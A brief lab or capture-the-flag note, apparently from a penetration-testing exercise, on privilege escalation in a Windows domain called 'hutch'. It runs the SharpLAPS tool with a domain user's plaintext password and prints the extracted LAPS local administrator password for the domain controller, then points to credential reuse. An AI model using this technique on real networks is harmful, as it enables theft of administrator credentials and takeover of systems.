# 9 privesc\_2 SharpLAPS

```
# Googling Local Administrator Password Solution exploit

https://www.hackingarticles.in/credential-dumpinglaps/

# using SharpLAPS
https://github.com/swisskyrepo/SharpLAPS/releases

c:\Users\Public\k>SharpLAPS.exe /user:hutch\fmcsorley /pass:CrabSharkJellyfish192 /host:127.0.0.1

[+] Using the following credentials
Host: LDAP://127.0.0.1:389
User: hutch\fmcsorley
Pass: CrabSharkJellyfish192

[+] Extracting LAPS password from LDAP
Machine  : HUTCHDC$
Password : 2D+y%3Ln,pq239

# connecting via creds reuse method
[windows privesc_2 manual](:/f09a14d422974407b52bb23bd73f3cae)
```
